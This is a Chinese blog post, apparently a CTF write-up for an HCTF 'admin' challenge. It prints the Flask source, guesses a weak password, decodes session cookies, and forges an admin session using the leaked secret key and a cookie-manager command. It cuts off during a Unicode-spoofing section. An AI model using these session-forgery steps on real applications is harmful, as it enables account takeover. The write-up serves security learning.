@@ -1,0 +1,399 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="野草">
+  <meta name="keywords" content="野草">
+  
+    <meta name="description" content="登录试一下，发现有admin这个用户，但是密码不知道，sql注入也没有成功。先用弱口令试试看，输入密码123，成功？？？弱口令爆破应该也是一种解法。 flask session伪造 其实在登录后的change password页面有一个提示，但是那个网站已经没了，以下是源码 1234567891011121314151617181920212223242526272829303132333435">
+<meta property="og:type" content="website">
+<meta property="og:title" content="admin">
+<meta property="og:url" content="https://ycqaq233.github.io/WriteUp/Web/admin.html">
+<meta property="og:site_name" content="野草">
+<meta property="og:description" content="登录试一下，发现有admin这个用户，但是密码不知道，sql注入也没有成功。先用弱口令试试看，输入密码123，成功？？？弱口令爆破应该也是一种解法。 flask session伪造 其实在登录后的change password页面有一个提示，但是那个网站已经没了，以下是源码 1234567891011121314151617181920212223242526272829303132333435">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/admin-1.png">
+<meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/admin-3.png">
+<meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/admin-4.png">
+<meta property="article:published_time" content="2024-11-19T12:34:39.000Z">
+<meta property="article:modified_time" content="2024-11-19T12:34:39.548Z">
+<meta property="article:author" content="野草">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ycqaq233.github.io/WriteUp/Web/img/admin-1.png">
+  
+  
+  
+  <title>admin - 野草</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ycqaq233.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>野草</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="admin"></span>
+          
+        </div>
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<article class="page-content">
+  <p><img src="img/admin-1.png" srcset="/img/loading.gif" lazyload alt><br>
+登录试一下，发现有admin这个用户，但是密码不知道，sql注入也没有成功。先用弱口令试试看，输入密码123，成功？？？弱口令爆破应该也是一种解法。</p>
+<h2><span id="flask-session伪造">flask session伪造</span></h2>
+<p>其实在登录后的change password页面有一个提示，但是那个网站已经没了，以下是源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_code</span>():<br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># 图片以二进制形式写入</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># 把buf_str作为response返回前端，并设置首部字段</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># 将验证码字符串储存在session中</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br> <br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br> <br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br> <br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>         <br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br> <br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">error</span>):<br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strlower</span>(<span class="hljs-params">username</span>):<br>    username = nodeprep.prepare(username)<br><span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure>
+<p>这不是我们高中学的flask框架吗，怎么给我干这来了。由于 flask 是非常轻量级的 Web框架 ，其 session 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对 session 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。假设现在我们有一串 session 值为： eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY ，那么我们可以通过如下代码对其进行解密：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> *<br>s = <span class="hljs-string">&quot;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&quot;</span><br>data,timestamp,secret = s.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data=&quot;</span>,data,<span class="hljs-string">&quot; ; timestamp = &quot;</span>,timestamp,<span class="hljs-string">&quot; ; secret = &quot;</span>,secret)<br><span class="hljs-built_in">print</span>(base64_decode(data))<br><span class="hljs-built_in">print</span>(base64_decode(timestamp))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>.from_bytes(base64_decode(timestamp),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>.from_bytes(base64_decode(secret),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>int.from_bytes函数功能：res = int.from_bytes(x)的含义是把bytes类型的变量x，转化为十进制整数，并存入res中。其中bytes类型是python3特有的类型。函数参数：int.from_bytes(bytes, byteorder, *, signed=False)。在IDLE或者命令行界面中使用help(int.from_bytes)命令可以查看具体介绍。<br>
+bytes是输入的变量；        base64_decode(timestamp)=b’\\r\xda\xe0’<br>
+signed=True表示需要考虑符号位。举例说明：int_s  = int.from_bytes(s, byteorder=‘little’, signed=True)，其中s=‘\xf1\xff’，则输出int_s=-15。分析一下过程，'\x’表示十六进制数，先把’f1’写成二进制数：1111 0001，‘ff’同上：1111 1111.     #小端法由于s的高低位标志是’little’，即’f1’是低位，‘ff’是高位，所以正确的顺序应该是’fff1’，即11111111 1111 0001.<br>
+又因为要考虑符号位，第一位是1，所以s是负数，要进行取反加一才是正确的十进制数（第一位符号位的1不变），可以得到10000000 00001111，写成十进制，就是-15，也就是int_s的结果。<br>
+上面的例子中，如果signed=False，则无符号位；若byteorder=‘big’，则输入s的左边是高位，右边是低位。     #大端法</p>
+</blockquote>
+<p>运行结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">data= eyJ1c2VyX2lkIjo2fQ  ; timestamp =  XA3a4A  ; secret =  R-ReVnWT8pkpFqM_52MabkZYIkY<br><span class="hljs-string">b&#x27;&#123;&quot;user_id&quot;:6&#125;&#x27;</span><br><span class="hljs-string">b&#x27;\\\r\xda\xe0&#x27;</span><br><span class="hljs-number">1544411872</span><br><span class="hljs-number">410431132609206592583504977459677031780417282630</span><br></code></pre></td></tr></table></figure>
+<p>sessino解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure>
+<p>我们打开changepassword页面，获取session。<img src="img/admin-3.png" srcset="/img/loading.gif" lazyload alt><br>
+用脚本破解得<img src="img/admin-4.png" srcset="/img/loading.gif" lazyload alt><br>
+破解结果</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> b&#x27;<span class="hljs-number">017</span>b837bac64b4ea3e94b88e771f532e685ea71c4c3d251c3c974e3e8ab583bd907ce40413edca5a5509d958a67a036506bd7c923f2ad0e57be8a561f42a7c0d&#x27;<span class="hljs-punctuation">,</span> &#x27;csrf_token&#x27;<span class="hljs-punctuation">:</span> b&#x27;d6055148868c3cfa5e6a4992b566d4907dc701eb&#x27;<span class="hljs-punctuation">,</span> &#x27;image&#x27;<span class="hljs-punctuation">:</span> b&#x27;b3Al&#x27;<span class="hljs-punctuation">,</span> &#x27;name&#x27;<span class="hljs-punctuation">:</span> &#x27;ycqaq&#x27;<span class="hljs-punctuation">,</span> &#x27;user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">10</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>接下来我们需要伪造密钥，首先我们要把name对应的用户名改成admin。然后我们需要一个密钥。尴尬的是密钥在源码里面，但是源码我们已经访问不到了。所以我这里就直接放出来，是ckj123<br>
+然后进行加密加密脚本</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;ckj123&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;017b837bac64b4ea3e94b88e771f532e685ea71c4c3d251c3c974e3e8ab583bd907ce40413edca5a5509d958a67a036506bd7c923f2ad0e57be8a561f42a7c0d&#x27;, &#x27;csrf_token&#x27;: b&#x27;d6055148868c3cfa5e6a4992b566d4907dc701eb&#x27;, &#x27;image&#x27;: b&#x27;b3Al&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+<p>不知道为什么我在kali下才能运行成功，windows没有返回结果。结果</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.eJw9kE-LwjAQxb_KkrOH_tGL4EE2aWlhEuqOWzIXcdtqmpouVEWt-N03uuDhXd7A7715d7bZDc3RsPlpODcTtmlrNr-zjx82ZxqpVXx5ATQHbatI4z4El4VyTIx05LTNDVmyEmsLuOq0FaG04iJLfVFpFkiUTqUi1iimVOpAYX0griPgieetvPJWYTdVWF11SZ6ZdMB9joUYeN4C5g4i3wEhkE7MqJSGUNxgrEbiay8dg_MMni3YY8Kq47DbnH67pn-_QJjNtMsCst-dxmUo03WkeBFTmhuF2VXa7irH4iZHMYVnfZcYWC5euNZt982btHWnz6_i_9JvXfO0atf2bMLOx2Z47cbCgD3-ADyZbJs</span><span class="hljs-selector-class">.Zzw_Gg</span>.QMW96hrOXI0cTP4eUIRrfV-Weq8<br></code></pre></td></tr></table></figure>
+<p>将结果放到session里面刷新即可得到flag</p>
+<h2><span id="unicode-欺骗">Unicode 欺骗</span></h2>
+<p>我们看一下之前route.py中的一段代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])                         <span class="hljs-comment">#1</span><br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> 